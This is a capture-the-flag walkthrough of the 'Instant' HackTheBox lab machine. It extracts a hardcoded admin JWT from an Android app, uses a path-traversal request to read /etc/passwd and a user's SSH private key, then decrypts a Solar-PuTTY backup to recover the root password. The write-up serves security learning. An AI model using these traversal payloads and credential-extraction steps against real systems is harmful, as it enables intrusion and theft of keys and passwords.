1,Recon
port scan
	22/tcp ssh
	80/tcp http Apache httpd 2.4.58
There is a `http://instant.htb/downloads/instant.apk` for us to download this app.

We can  use `JADX` to convert it to java code.
Then we find something interesting
```
 new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA").build()).enqueue(new Callback() { // from class: com.instantlabs.instant.AdminActivities.1  
            static final /* synthetic */ boolean $assertionsDisabled = false;

an admin JWT token hardcoded into the apk,and a sub-domain: mywalletv1.instant.htb
```
And another xml file of network_security_config.xml
```
<?xml version="1.0" encoding="utf-8"?>  
<network-security-config>  
    <domain-config cleartextTrafficPermitted="true">  
        <domain includeSubdomains="true">mywalletv1.instant.htb  
        </domain>  
        <domain includeSubdomains="true">swagger-ui.instant.htb  
        </domain>  
    </domain-config>  
</network-security-config>
```

Finally, we get 2 subdomain and an admin JWT token hardcoded into the apk.
`mywalletv1.instant.htb`
`swagger-ui.instant.htb`
Add the two subdomains to your /etc/hosts and visit the swagger-ui.instant.htb, authorize via the JWT token and now you can test the apis, one should sticks out because it let’s us input a file path.

When we check the page of `http://swagger-ui.instant.htb/apidocs/#/`
![](images/Pasted%20image%2020241026023636.png)
Maybe we can use the admin token to check the logs.

We can use burpsuite to handle that query
```
GET /api/v1/admin/read/log?log_file_name=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: swagger-ui.instant.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://swagger-ui.instant.htb/apidocs/
DNT: 1
Connection: close

```

Then we get the /etc/passwd:
```
"root:x:0:0:root:/root:/bin/bash\n","daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n","bin:x:2:2:bin:/bin:/usr/sbin/nologin\n",
.........
.........
.......
.....
...
..
.
"usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n","sshd:x:104:65534::/run/sshd:/usr/sbin/nologin\n","shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash\n","_laurel:x:999:990::/var/log/laurel:/bin/false\n"
```

`shirohige` seems to be a valid user and let's try to get his id_rsa.
The payload would be 
`/api/v1/admin/read/log?log_file_name=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Fshirohige%2F.ssh%2Fid_rsa `

Then we can get the id_rsa successfully and we can login into the shell of user `shirohige`.

2,shell as root
Firstly I would like check what can `shirohige` do as root.But very sadly, we could not check it because of loss of credit.So let's continue to enumerate the target machine.

By check the netstate of machine, we find port 8808 and 8888 are used and powered by python3.
```
shirohige@instant:~$ curl 127.0.0.1:8808
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/apidocs">/apidocs</a>. If not, click the link.

shirohige@instant:~$ curl 127.0.0.1:8888
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

So we can forward the port 8808 to our local machine.
We would find a rabbit hole there, the service of port 8808 is the previous page
![](images/Pasted%20image%2020241026025855.png)

Maybe we can use some tools to help us find something useful.
So I would use `linpeas.sh` to check it.
We found 2 database file which i would check them.
```
Found /home/shirohige/projects/mywallet/Instant-Api/mywallet/instance/instant.db                                                                                                
Found /var/lib/PackageKit/transactions.db

1, instantAdmin, admin@instant.htb, f0eca6e5-783a-471d-9d8f-0162cbc900db, pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978, 2024-07-23 00:20:52.529887, 87348, Admin, active
```

But this password hash seems not to crack.

There is some attractive backup files from /opt
```
/opt/backups
/opt/backups/Solar-PuTTY
/opt/backups/Solar-PuTTY/sessions-backup.dat
```

In this `sessions-backup.dat` ,we only find some encrypted data
```
ZJlEkpkqLgj2PlzCyLk4gtCfsGO2CMirJoxxdpclYTlEshKzJwjMCwhDGZzNRr0fNJMlLWfpbdO7l2fEbSl/OzVAmNq0YO94RBxg9p4pwb4upKiVBhRY22HIZFzy6bMUw363zx6lxM4i9kvOB0bNd/4PXn3j3wVMVzpNxuKuSJOvv0fzY/ZjendafYt1Tz1VHbH4aHc8LQvRfW6Rn+5uTQEXyp4jE+ad4DuQk2fbm9oCSIbRO3/OKHKXvpO5Gy7db1njW44Ij44xDgcIlmNNm0m4NIo1Mb/2ZBHw/MsFFoq/TGetjzBZQQ/rM7YQI81SNu9z9VVMe1k7q6rDvpz1Ia7JSe6fRsBugW9D8GomWJNnTst7WUvqwzm29dmj7JQwp+OUpoi/j/HONIn4NenBqPn8kYViYBecNk19Leyg6pUh5RwQw8Bq+6/OHfG8xzbv0NnRxtiaK10KYh++n/Y3kC3t+Im/EWF7sQe/syt6U9q2Igq0qXJBF45Ox6XDu0KmfuAXzKBspkEMHP5MyddIz2eQQxzBznsgmXT1fQQHyB7RDnGUgpfvtCZS8oyVvrrqOyzOYl8f/Ct8iGbv/WO/SOfFqSvPQGBZnqC8Id/enZ1DRp02UdefqBejLW9JvV8gTFj94MZpcCb9H+eqj1FirFyp8w03VHFbcGdP+u915CxGAowDglI0UR3aSgJ1XIz9eT1WdS6EGCovk3na0KCz8ziYMBEl+yvDyIbDvBqmga1F+c2LwnAnVHkFeXVua70A4wtk7R3jn8+7h+3Evjc1vbgmnRjIp2sVxnHfUpLSEq4oGp3QK+AgrWXzfky7CaEEEUqpRB6knL8rZCx+Bvw5uw9u81PAkaI9SlY+60mMflf2r6cGbZsfoHCeDLdBSrRdyGVvAP4oY0LAAvLIlFZEqcuiYUZAEgXgUpTi7UvMVKkHRrjfIKLw0NUQsVY4LVRaa3rOAqUDSiOYn9F+Fau2mpfa3c2BZlBqTfL9YbMQhaaWz6VfzcSEbNTiBsWTTQuWRQpcPmNnoFN2VsqZD7d4ukhtakDHGvnvgr2TpcwiaQjHSwcMUFUawf0Oo2+yV3lwsBIUWvhQw2g=
```

So let's find some tools to decrypt `SolarPuTTY` session.
![](images/Pasted%20image%2020241026040902.png)

```
.\SolarPuttyDecrypt.exe .\sessions-backup.dat estrella
-----------------------------------------------------
SolarPutty's Sessions Decrypter by VoidSec
-----------------------------------------------------

{
  "Sessions": [
    {
      "Id": "066894ee-635c-4578-86d0-d36d4838115b",
      "Ip": "10.10.11.37",
      "Port": 22,
      "ConnectionType": 1,
      "SessionName": "Instant",
      "Authentication": 0,
      "CredentialsID": "452ed919-530e-419b-b721-da76cbe8ed04",
      "AuthenticateScript": "00000000-0000-0000-0000-000000000000",
      "LastTimeOpen": "0001-01-01T00:00:00",
      "OpenCounter": 1,
      "SerialLine": null,
      "Speed": 0,
      "Color": "#FF176998",
      "TelnetConnectionWaitSeconds": 1,
      "LoggingEnabled": false,
      "RemoteDirectory": ""
    }
  ],
  "Credentials": [
    {
      "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
      "CredentialsName": "instant-root",
      "Username": "root",
      "Password": "12**24nzC!r0c%q12",
      "PrivateKeyPath": "",
      "Passphrase": "",
      "PrivateKeyContent": null
    }
  ],
  "AuthScript": [],
  "Groups": [],
  "Tunnels": [],
  "LogsFolderDestination": "C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"
}
```

Then we can successfully su root and get the root shell.
